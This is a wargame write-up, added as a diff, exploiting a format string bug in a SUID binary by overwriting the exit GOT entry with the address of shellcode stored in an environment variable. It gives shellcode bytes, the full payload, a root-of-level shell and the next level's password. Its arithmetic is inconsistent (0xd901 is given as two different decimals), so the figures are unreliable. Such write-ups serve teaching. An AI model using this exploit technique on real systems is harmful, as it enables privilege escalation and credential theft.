@@ -1,1 +1,188 @@
-hello flag
+# Level05 — Format String Write-What-Where & GOT Overwrite
+
+## Context
+
+Inside the home directory of the `level05` user, we find a binary named `level05`.
+The program reads user input, transforms uppercase letters to lowercase, then prints the result using a vulnerable `printf` call.
+Our objective is to exploit a format string write vulnerability to overwrite the Global Offset Table (GOT) and redirect program execution to shellcode.
+
+---
+
+## Initial Environment — Directory Listing
+
+```bash
+$ ls -la
+total 17
+dr-xr-x---+ 1 level06 level06   80 Oct  2  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level06 level06  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
+-rw-r--r--  1 level06 level06  675 Sep 10  2016 .profile
+```
+
+> **Note:** the binary `level05` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`level06`).
+
+---
+
+## Running the Binary
+
+```bash
+$ ./level05
+HELLO WORLD
+hello world
+```
+
+The program converts uppercase letters to lowercase and prints the result.
+
+---
+
+## Static Analysis (Disassembly)
+
+**Program Flow Analysis:**
+
+### Input Reading
+```asm
+0x08048475 <+49>:    call   0x8048350 <fgets@plt>    ; Read input (100 bytes)
+```
+
+### Character Transformation Loop
+```asm
+0x08048495 <+81>:    cmp    $0x40,%al               ; Compare with '@' (0x40)
+0x08048497 <+83>:    jle    0x80484cb <main+135>     ; Skip if <= '@'
+0x080484a7 <+99>:    cmp    $0x5a,%al               ; Compare with 'Z' (0x5a)
+0x080484a9 <+101>:   jg     0x80484cb <main+135>     ; Skip if > 'Z'
+0x080484bb <+119>:   xor    $0x20,%edx               ; Convert to lowercase (XOR with 0x20)
+```
+
+### Vulnerable Printf Call
+```asm
+0x08048507 <+195>:   call   0x8048340 <printf@plt>   ; Direct printf without format string!
+```
+
+### Program Exit
+```asm
+0x0804850c <+200>:   movl   $0x0,(%esp)
+0x08048513 <+207>:   call   0x8048370 <exit@plt>
+```
+
+**Critical observations:**
+* Input buffer located at `esp+0x28`
+* Uppercase letters (A-Z) converted to lowercase using XOR 0x20
+* **Format string vulnerability** in printf call
+* Program calls `exit()` after printf
+
+---
+
+## Vulnerability Analysis
+
+### Format String Write Capability
+
+Testing format string vulnerability:
+
+```bash
+$ (python -c 'print "a" * 8 + " %x " * 20') | ./level05
+aaaaaaaa 64 f7fcfac0 f7ec3af9 ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 61616161 20782520 20782520 20782520 20782520 20782520 20782520 20782520 20782520 20782520
+```
+
+**Key findings:**
+* Format string vulnerability confirmed
+* Our input appears at positions 10 and 11 on the stack
+* We can use `%n` to write values to memory addresses
+
+---
+
+## Exploitation Strategy
+
+### Step 1: GOT Overwrite Target Selection
+
+Since the program calls `exit()` after printf, we need to redirect execution before the program terminates. The Global Offset Table (GOT) entry for `exit()` is an ideal target.
+
+**GOT Analysis:**
+```bash
+(gdb) disass exit
+0x08048370 <+0>:    jmp    *0x80497e0    ; exit@GOT address
+```
+
+**Target addresses:**
+* `exit@GOT`: `0x080497e0`
+* We need to overwrite this with our shellcode address
+
+### Step 2: Shellcode Deployment
+
+Store shellcode in environment variable for reliable addressing:
+
+```bash
+$ export SHELL=`python -c 'print "\x90" * 10 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
+```
+
+**Address discovery:**
+```bash
+$ /tmp/helper_program
+0xffffd901    # SHELL environment variable address
+```
+
+### Step 3: Format String Write Construction
+
+**Target:** Overwrite `0x080497e0` with `0xffffd901`
+
+**Memory layout for GOT overwrite:**
+* Lower 2 bytes: `0x97e0` → write `0xd901` (55809 decimal)
+* Upper 2 bytes: `0x97e2` → write `0xffff` (65535 decimal)
+
+**Payload construction:**
+```
+ADDRESS1 + ADDRESS2 + FORMAT_STRING_WRITES
+```
+
+Where:
+* `ADDRESS1` = `0x080497e0` (exit@GOT lower half)
+* `ADDRESS2` = `0x080497e2` (exit@GOT upper half)
+* Write `55553` to position 10, then `65535-55553=9982` more to position 11
+
+---
+
+## Payload Development
+
+### Format String Write Calculation
+
+**Target values:**
+* Position 10: `0xd901` = 55553 decimal
+* Position 11: `0xffff` = 65535 decimal
+* Difference: 65535 - 55553 = 9982
+
+**Format string payload:**
+```bash
+"\xe0\x97\x04\x08" +     # Address 1: exit@GOT lower
+"\xe2\x97\x04\x08" +     # Address 2: exit@GOT upper  
+"%55545d%10$n" +         # Write 55553 to address 1 (55545 + 4 bytes of ADDRESS1 + 4 bytes of ADDRESS2 =  55553)
+"%9982d%11$n"            # Write additional 9982 to address 2 (total 65535)
+```
+
+**Refined calculation:**
+* We need 55553 total bytes before first write
+* We already have 8 bytes from addresses
+* Need 55553 - 8 = 55545 padding, but use 55545 + adjustments
+* For second write: need 9982 more bytes
+
+---
+
+## Exploitation
+
+```bash
+$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55545d%10$n" + "%9982d%11$n"'; cat) | ./level05 | tr -d ' '
+```
+
+**Result analysis:**
+```bash
+id
+uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
+
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
+
+**Success:** Shell access with `level06` privileges and password extraction!
+
+---
